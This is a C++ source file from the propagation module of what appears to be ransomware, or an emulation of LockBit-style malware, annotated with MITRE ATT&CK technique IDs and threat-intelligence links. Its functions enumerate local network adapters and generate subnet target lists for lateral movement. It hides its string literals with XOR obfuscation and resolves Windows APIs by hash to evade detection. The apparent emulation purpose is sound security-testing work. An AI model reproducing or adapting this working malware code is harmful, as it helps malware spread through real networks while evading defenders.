#include <vector>
#include <tuple>
#include <format>
#include <stdexcept>
#include <sstream>
#include "crypto/xor_obfuscation.hpp"
#include "logger.hpp"
#include "propagate.hpp"
#include "util/network_util.hpp"

namespace propagate {

/*
 * GetTargetsFromLocalCidr:
 *      About:
 *          Given local IPAddr (network-byte order) and CIDR netmask size, returns vector of IPAddr representing 
 *          the target remote addresses to attempt to propagate to.
 *          Excludes the first and last IP of the subnet (network and broadcast addresses), the local address itself,
 *          and any loopback or multicast addresses. Also excludes any ip addresses that don't fall within the strict 
 *          includes set, if a non-empty set is provided.
 *      Result:
 *          std::vector of IPAddr representing the target remote addresses to attempt to propagate to.
 */
std::vector<IPAddr> GetTargetsFromLocalCidr(IPAddr local_addr, uint32_t netmask_size, const std::set<IPAddr>& strict_include_ping_targets) {
    std::vector<IPAddr> targets;
    if (netmask_size < 16) {
        XorLogger::LogError(std::format(
            "{} {} {}", 
            XOR_LIT("Netmask CIDR size of"),
            netmask_size,
            XOR_LIT("is too large to propagate to efficiently. Returning 0 targets.")
        ));
    } else if (netmask_size > 32) {
        XorLogger::LogError(std::format(
            "{} {}. {}", 
            XOR_LIT("Invalid netmask CIDR size"),
            netmask_size,
            XOR_LIT("Returning 0 targets.")
        ));
    } else {
        targets.reserve(network_util::IntPow(2, 32 - netmask_size));
        ULONG local_addr_val = ntohl(local_addr); // network byte order to host byte order
        ULONG start_val = network_util::GetSubnetStart(local_addr_val, netmask_size);
        ULONG end_val = network_util::GetSubnetEnd(local_addr_val, netmask_size);
        for (ULONG i = start_val + 1; i < end_val; i++) {
            if (i != local_addr_val && !network_util::IsLoopback(i) && !network_util::IsMulticast(i)) {
                IPAddr addr = htonl(i);
                if (strict_include_ping_targets.empty() || strict_include_ping_targets.contains(addr)) {
                    targets.push_back(addr);
                }
            }
        }
    }
    return targets;
}

/*
 * GetLocalIpv4AndCidr:
 *      About:
 *          Gets the local IPv4 addresses and CIDR subnet masks for the network adapters on
 *          the local target machine. This information will be used to ping remote targets as
 *          part of lateral movement. Local IP and CIDR information is gathered using the
 *          GetAdaptersInfo API call.
 *      Result:
 *          std::vector of tuples containing the IPv4 addresses (IPAddr) and CIDR masks (uint32_t)
 *          for each discovered local network adapter.
 *      MITRE ATT&CK Techniques:
 *          T1016: System Network Configuration Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/
 *      Other References:
 *           https://learn.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
 */
std::vector<std::tuple<IPAddr, uint32_t>> GetLocalIpv4AndCidr() {
    std::vector<std::tuple<IPAddr, uint32_t>> result_vec;
    DWORD error_code;
    FP_GetAdaptersInfo getAdaptersInfo = (FP_GetAdaptersInfo)winapi_helper::GetAPI(0xbc950fc5, XOR_WIDE_LIT(L"Iphlpapi.dll"), &error_code);
    if (getAdaptersInfo == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for GetAdaptersInfo. Error code"), error_code));
        return result_vec;
    }

    ULONG buf_len = sizeof(IP_ADAPTER_INFO);
    std::vector<char> adapter_info_buf(buf_len);
    IP_ADAPTER_INFO* p_adapter_info_buf = (IP_ADAPTER_INFO*)(&adapter_info_buf[0]);
    IP_ADAPTER_INFO* p_curr_adapter_info = NULL;
    ULONG result = getAdaptersInfo(p_adapter_info_buf, &buf_len);

    // Reallocate buffer if needed
    if (result == ERROR_BUFFER_OVERFLOW) {
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Resizing buffer for GetAdaptersInfo to"), buf_len));
        adapter_info_buf.resize(buf_len);
        p_adapter_info_buf = (IP_ADAPTER_INFO*)(&adapter_info_buf[0]);
        result = getAdaptersInfo(p_adapter_info_buf, &buf_len);
    }
     
    if (result != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{} {}", XOR_LIT("GetAdaptersInfo error code"), result));
    }

    // Loop through adapters to get IP address and netrange info
    XorLogger::LogDebug(XOR_LIT("Walking through adapter info linked list"));
    p_curr_adapter_info = p_adapter_info_buf;
    while (p_curr_adapter_info != NULL) {
        std::string adapter_name(p_curr_adapter_info->AdapterName);
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Found adapter name"), adapter_name));

        // Get each IP address and associated netmask
        IP_ADDR_STRING* curr_ip_addr_info = &(p_curr_adapter_info->IpAddressList);
        while (curr_ip_addr_info != NULL) {
            std::string ip_addr_str(curr_ip_addr_info->IpAddress.String);
            std::string mask_str(curr_ip_addr_info->IpMask.String); // 255.255.255.0 style format
            if (ip_addr_str.length() == 0) {
                XorLogger::LogError(std::format("{} {}", XOR_LIT("Failed to get IP address string for adapter"), adapter_name));
            } else if (mask_str.length() == 0) {
                XorLogger::LogError(std::format("{} {}", XOR_LIT("Failed to get net mask string for adapter"), adapter_name));
            } else {
                IPAddr ip_addr = inet_addr(ip_addr_str.c_str());
                if (ip_addr == INADDR_NONE) {
                    XorLogger::LogError(std::format("{} {}: {}", XOR_LIT("Invalid IP address string for adapter"), adapter_name, ip_addr_str));
                } else {
                    try {
                        uint32_t mask_size = network_util::GetNetMaskSize(mask_str);
                        XorLogger::LogDebug(std::format("{} {}: {}/{}", XOR_LIT("Found IP address and CIDR for adapter"), adapter_name, ip_addr_str, mask_size));
                        result_vec.push_back(std::tuple<IPAddr, uint32_t>(ip_addr, mask_size));
                    } catch (const std::exception& e) {
                        XorLogger::LogError(std::format("{} {}: {}", XOR_LIT("Failed to get net mask size for adapter"), adapter_name, e.what()));
                    }
                }
            }
            curr_ip_addr_info = curr_ip_addr_info->Next;
        }

        // Move on to next adapter
        p_curr_adapter_info = (*p_curr_adapter_info).Next;
    }
    return result_vec;
}

} // namespace